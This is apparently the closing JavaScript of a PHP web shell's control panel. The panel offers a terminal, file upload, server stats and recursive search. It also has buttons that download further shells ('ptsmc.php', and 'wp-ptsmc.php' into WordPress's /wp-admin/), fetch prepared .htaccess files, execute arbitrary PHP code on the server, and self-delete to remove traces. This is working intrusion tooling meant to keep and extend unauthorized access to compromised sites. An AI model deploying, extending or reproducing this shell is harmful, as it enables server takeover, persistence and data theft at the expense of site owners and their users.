                termInput.value = G.terminalHistory[++G.terminalHistoryIndex];
            } else {
                G.terminalHistoryIndex = G.terminalHistory.length;
                termInput.value = '';
            }
        }
    }

    function initDraggableResizableTerminal() {
        const terminal = document.querySelector('#terminalModal .modal-content');
        const header = terminal.querySelector('.modal-header');
        const resizer = terminal.querySelector('.resizer-se');
        
        const makeDraggable = (elmnt, dragHandle) => {
            let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
            dragHandle.onmousedown = (e) => {
                e.preventDefault();
                pos3 = e.clientX;
                pos4 = e.clientY;
                document.onmouseup = closeDragElement;
                document.onmousemove = elementDrag;
                G.dom.body.classList.add('is-dragging');
            };
            const elementDrag = (e) => {
                e.preventDefault();
                pos1 = pos3 - e.clientX;
                pos2 = pos4 - e.clientY;
                pos3 = e.clientX;
                pos4 = e.clientY;
                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
            };
            const closeDragElement = () => {
                document.onmouseup = null;
                document.onmousemove = null;
                G.dom.body.classList.remove('is-dragging');
            };
        };

        const makeResizable = (elmnt, resizeHandle) => {
            let startX, startY, startWidth, startHeight;
            resizeHandle.onmousedown = (e) => {
                e.preventDefault();
                startX = e.clientX;
                startY = e.clientY;
                startWidth = parseInt(document.defaultView.getComputedStyle(elmnt).width, 10);
                startHeight = parseInt(document.defaultView.getComputedStyle(elmnt).height, 10);
                document.onmousemove = doResize;
                document.onmouseup = stopResize;
                G.dom.body.classList.add('is-dragging');
            };
            const doResize = (e) => {
                elmnt.style.width = (startWidth + e.clientX - startX) + 'px';
                elmnt.style.height = (startHeight + e.clientY - startY) + 'px';
            };
            const stopResize = () => {
                document.onmousemove = null;
                document.onmouseup = null;
                G.dom.body.classList.remove('is-dragging');
            };
        };
        
        makeDraggable(terminal, header);
        makeResizable(terminal, resizer);
    }

    function initUploader() {
        const dropOverlay = document.getElementById('drop-overlay');
        document.getElementById('upload-btn').addEventListener('click', () => document.getElementById('upload-input-hidden').click());
        document.getElementById('upload-input-hidden').addEventListener('change', e => uploadFiles(e.target.files));
        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
            G.dom.body.addEventListener(eventName, e => { e.preventDefault(); e.stopPropagation(); });
        });
        ['dragenter', 'dragover'].forEach(eventName => {
            G.dom.body.addEventListener(eventName, () => dropOverlay.style.display = 'flex');
        });
        ['dragleave', 'drop'].forEach(eventName => {
            G.dom.body.addEventListener(eventName, () => dropOverlay.style.display = 'none');
        });
        G.dom.body.addEventListener('drop', e => uploadFiles(e.dataTransfer.files));
    }

    function uploadFiles(files) {
        if (!files.length) return;
        const uploadList = document.getElementById('upload-progress-list');
        uploadList.innerHTML = '';
        openModal('uploadModal');
        let completed = 0;
        Array.from(files).forEach((file, index) => {
            const item = document.createElement('li');
            item.className = 'upload-progress-item';
            item.innerHTML = `<p>${escapeHTML(file.name)}</p><div class="progress-bg"><div class="progress-fill" id="progress-${index}"></div></div><span class="upload-status" id="status-${index}">Waiting...</span>`;
            uploadList.appendChild(item);
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('dir', G.state.currentDir);
            formData.append('files[]', file);
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.upload.onprogress = e => {
                if (e.lengthComputable) {
                    const percent = (e.loaded / e.total) * 100;
                    document.getElementById(`progress-${index}`).style.width = percent + '%';
                    document.getElementById(`status-${index}`).innerText = `${formatBytes(e.loaded)} / ${formatBytes(e.total)}`;
                }
            };
            xhr.onload = () => {
                const statusEl = document.getElementById(`status-${index}`);
                if (xhr.status === 200) {
                    try {
                        const result = JSON.parse(xhr.responseText);
                        if (result.status === 'success') {
                            statusEl.innerText = 'Success!';
                            statusEl.style.color = 'var(--success-color)';
                        } else {
                            statusEl.innerText = `Error: ${result.message}`;
                            statusEl.className = 'upload-status error';
                        }
                    } catch (e) {
                         statusEl.innerText = 'Error: Invalid server response.';
                         statusEl.className = 'upload-status error';
                    }
                } else {
                    statusEl.innerText = `Error: Server responded with status ${xhr.status}`;
                    statusEl.className = 'upload-status error';
                }
                completed++;
                if (completed === files.length) {
                    setTimeout(() => window.location.reload(), 1000);
                }
            };
            xhr.onerror = () => {
                const statusEl = document.getElementById(`status-${index}`);
                statusEl.innerText = 'Upload failed due to a network error.';
                statusEl.className = 'upload-status error';
                completed++;
                if (completed === files.length) {
                    setTimeout(() => window.location.reload(), 1000);
                }
            };
            xhr.send(formData);
        });
    }

    // Ditinggalkan untuk mematuhi aturan "JANGAN HAPUS FUNGSI"
    function initResourceChart() {
        const ctx = document.getElementById('resourceChart');
        if (!ctx) return; // Tambahkan cek untuk mencegah error jika elemen tidak ada
        const isLight = G.dom.body.classList.contains('light-mode');
        const gridColor = isLight ? 'rgba(0,0,0,0.1)' : 'rgba(255,255,255,0.1)';
        const fontColor = isLight ? '#111' : '#E9ECEF';

        G.resourceChart = new Chart(ctx.getContext('2d'), {
            type: 'line',
            data: {
                labels: Array(10).fill(''),
                datasets: [{
                    label: 'CPU Usage (%)',
                    data: Array(10).fill(0),
                    borderColor: 'rgba(255, 0, 0, 1)',
                    backgroundColor: 'rgba(255, 0, 0, 0.2)',
                    fill: true,
                    yAxisID: 'y',
                }, {
                    label: 'Memory (MB)',
                    data: Array(10).fill(0),
                    borderColor: 'rgba(179, 0, 254, 1)',
                    backgroundColor: 'rgba(179, 0, 254, 0.2)',
                    fill: true,
                    yAxisID: 'y1',
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                scales: {
                    x: { ticks: { display: false }, grid: { color: gridColor } },
                    y: { type: 'linear', display: true, position: 'left', min: 0, max: 100, ticks: { color: fontColor } , grid: { color: gridColor } },
                    y1: { type: 'linear', display: true, position: 'right', ticks: { color: fontColor }, grid: { drawOnChartArea: false } }
                },
                plugins: { legend: { labels: { color: fontColor, boxWidth: 10, padding: 15 }, position: 'bottom' } },
                animation: { duration: 500 },
                elements: { point:{ radius: 0 } },
                interaction: { intersect: false, mode: 'index' },
                tooltips: { enabled: false }
            }
        });

        setInterval(updateResourceChart, 2000);
    }

    // Ditinggalkan untuk mematuhi aturan "JANGAN HAPUS FUNGSI"
    function updateResourceChartTheme() {
        if (!G.resourceChart) return;
        const isLight = G.dom.body.classList.contains('light-mode');
        const gridColor = isLight ? 'rgba(0,0,0,0.1)' : 'rgba(255,255,255,0.1)';
        const fontColor = isLight ? '#111' : '#E9ECEF';
        G.resourceChart.options.scales.x.grid.color = gridColor;
        G.resourceChart.options.scales.y.grid.color = gridColor;
        G.resourceChart.options.scales.y.ticks.color = fontColor;
        G.resourceChart.options.scales.y1.ticks.color = fontColor;
        G.resourceChart.options.plugins.legend.labels.color = fontColor;
        G.resourceChart.update();
    }
    
    // Ditinggalkan untuk mematuhi aturan "JANGAN HAPUS FUNGSI"
    async function updateResourceChart() {
        if (!G.resourceChart) return;
        try {
            const res = await fetch('?action=get_server_stats');
            const data = await res.json();
            
            const chartData = G.resourceChart.data;
            chartData.labels.shift();
            chartData.labels.push('');
            
            chartData.datasets[0].data.shift();
            chartData.datasets[0].data.push(data.cpu);
            
            chartData.datasets[1].data.shift();
            chartData.datasets[1].data.push(data.mem_used);
            
            G.resourceChart.options.scales.y1.max = data.mem_total;
            G.resourceChart.update();
        } catch(e) {
            // Console error will happen here if chart is removed from UI, but function must stay.
        }
    }
    
    // --- New v7.0/v8.0/v8.1/v8.2 Functions ---
    async function handleWpCacheFlush() {
        const statusEl = document.getElementById('wp-cache-status');
        statusEl.style.display = 'block';
        statusEl.style.backgroundColor = 'var(--border-color)';
        statusEl.textContent = 'Flushing...';
        const result = await performSimpleAction('flush_wp_cache', {}, false);
        if (result.status === 'success') {
            statusEl.style.backgroundColor = 'var(--success-color)';
        } else {
            statusEl.style.backgroundColor = 'var(--danger-color)';
        }
        statusEl.textContent = result.message;
    }

    // [NEW FEATURE] Random Path Handler
    async function handleRandomPath() {
        showConfirmModal(
            'Go to Random Path',
            'Are you sure you want to navigate to a random directory on the server? This can be any folder.',
            async () => {
                const result = await performSimpleAction('random_path', {}, false);
                if (result.status === 'success' && result.path) {
                    window.location.href = '?dir=' + encodeURIComponent(result.path);
                } else {
                    showToast(result.message || 'Failed to find a random path.', 'error');
                }
            }
        );
    }
    
    // [NEW FEATURE v8.1] PHP Shell Summoner Handler
    function handleSummonPtsmc() {
        showConfirmModal(
            'Summon ptsmc.php Shell',
            'This will download the PTSMC Shell script and save it as ptsmc.php in the current directory (0644 perms). Continue?',
            () => {
                performSimpleAction('summon_ptsmc', {}, true);
            }
        );
    }
    
    // [NEW FEATURE v8.2] WordPress Shell Summoner Handler
    function handleSummonWpPtsmc() {
        showConfirmModal(
            'Summon wp-ptsmc.php Shell',
            'This will download a shell script to the /wp-admin/ directory and set permissions to 0644. Upon success, the access link will open in a new tab. Continue?',
            async () => {
                const result = await performSimpleAction('summon_wp_ptsmc', {}, false);
                if (result.status === 'success') {
                    showToast(result.message, 'success');
                    if (result.url_akses) {
                        window.open(result.url_akses, '_blank');
                    } else {
                        showToast("File created, but failed to determine the public URL. Access it manually.", 'warning');
                    }
                    setTimeout(() => window.location.reload(), 500);
                } else {
                    showToast(result.message || 'Failed to summon wp-ptsmc.php.', 'error');
                }
            }
        );
    }

    // [NEW FEATURE] HTB Fetcher function
    function handleFetchHtb() {
        showConfirmModal(
            'Fetch .htaccess-htb',
            'This will download a .htaccess file (named .htaccess-htb) to the current directory and set its permissions to 0444. Continue?',
            () => {
                performSimpleAction('fetch_htb', {}, true);
            }
        );
    }
    
    // [NEW FEATURE] HTD Fetcher function
    function handleFetchHtd() {
        showConfirmModal(
            'Fetch .htaccess-htd',
            'This will download a .htaccess file (named .htaccess-htd) to the current directory and set its permissions to 0444. Continue?',
            () => {
                performSimpleAction('fetch_htd', {}, true);
            }
        );
    }

    async function handleRecursiveSearch(e) {
        e.preventDefault();
        showLoader();
        const query = document.getElementById('search-query').value;
        const resultsContainer = document.getElementById('search-results');
        resultsContainer.innerHTML = 'Searching...';
        try {
            const res = await fetch(`?action=recursive_search&query=${encodeURIComponent(query)}&dir=${encodeURIComponent(G.state.currentDir)}`);
            const data = await res.json();
            if (data.results && data.results.length > 0) {
                resultsContainer.innerHTML = data.results.map(r => {
                    const iconName = getIconForItem(r);
                    const link = r.is_dir ? `?dir=${encodeURIComponent(r.path)}` : `#`;
                    const clickHandler = r.is_dir ? '' : `onclick="event.preventDefault(); openEditor('${escapeJS(r.path)}')"`;
                    return `<div><i data-feather="${iconName}"></i> <a href="${link}" ${clickHandler}>${escapeHTML(r.path)}</a></div>`;
                }).join('');
                feather.replace();
            } else {
                resultsContainer.innerHTML = 'No results found.';
            }
        } catch(e) {
            resultsContainer.innerHTML = 'An error occurred during search.';
        } finally {
            hideLoader();
        }
    }

    function handleSelfDestruct() {
        showConfirmModal(
            'Self Destruct Confirmation',
            'Are you sure you want to permanently delete this script file from the server? You will lose access immediately.',
            async () => {
                const result = await performSimpleAction('self_destruct', {}, false);
                if(result.status === 'success') {
                    // Disable UI interaction after successful deletion
                    document.body.innerHTML = `<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:var(--main-bg); color:var(--success-color); display:flex; justify-content:center; align-items:center; text-align:center; font-size:20px;">${result.message}</div>`;
                }
            }
        );
    }

    async function handlePhpRunner(e) {
        e.preventDefault();
        const code = document.getElementById('php-code').value;
        const outputEl = document.getElementById('php-code-output');
        outputEl.innerHTML = "Executing...";
        const formData = new FormData();
        formData.append('action', 'run_php_code');
        formData.append('dir', G.state.currentDir);
        formData.append('code', code);
        const result = await performApiAction(formData, false);
        if (result.status === 'success') {
            outputEl.textContent = result.output;
        } else {
            outputEl.textContent = `Error: ${result.message}`;
        }
    }

    // --- Utility Functions ---
    function showLoader() { document.getElementById('loading-overlay').style.display = 'flex'; }
    function hideLoader() { document.getElementById('loading-overlay').style.display = 'none'; }
    function showToast(text, type = 'success') { const container = document.getElementById('toast-container'); const toast = document.createElement('div'); toast.className = `message ${type}`; toast.innerHTML = `<p>${text}</p>`; toast.style.display = 'flex'; container.appendChild(toast); setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 500); }, 5000); }
    function formatBytes(bytes, decimals = 2) { if (bytes <= 0) return '0 B'; const k = 1024; const dm = decimals < 0 ? 0 : decimals; const sizes = ['B', 'KB', 'MB', 'GB', 'TB']; const i = Math.floor(Math.log(bytes) / Math.log(k)); return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i]; }
    function formatDate(timestamp) { if (!timestamp || timestamp <= 0) return 'N/A'; const d = new Date(timestamp * 1000); const pad = n => String(n).padStart(2, '0'); return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`; }
    function escapeHTML(str) { return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;'); }
    function escapeJS(str) { return String(str).replace(/\\/g, '\\\\').replace(/'/g, "\\'"); }
    function escapeCSS(str) { return CSS.escape(str); }
    </script>
</body>
</html>
